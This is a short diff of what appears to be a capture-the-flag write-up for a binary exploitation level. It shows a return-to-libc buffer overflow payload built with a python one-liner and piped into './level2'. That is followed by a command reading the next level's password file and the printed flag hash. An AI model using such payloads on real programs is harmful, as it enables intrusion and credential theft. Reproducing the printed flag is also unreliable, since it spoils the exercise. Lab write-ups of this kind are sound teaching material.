@@ -32,7 +32,7 @@ The attack is constructed as follow: first induce the overflow then trigger a re
 
 ```shell
   $> (python -c "print '\x90' * 80 + '\x08\x04\x85\x3e'[::-1] + '\xb7\xe6\xb0\x60'[::-1] + '\xb7\xe5\xeb\xe0'[::-1] + '\xb7\xf8\xcc\x58'[::-1]"; cat) | ./level2
-  $> cat /home/user/level3/.pass
+  cat /home/user/level3/.pass
   492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
 
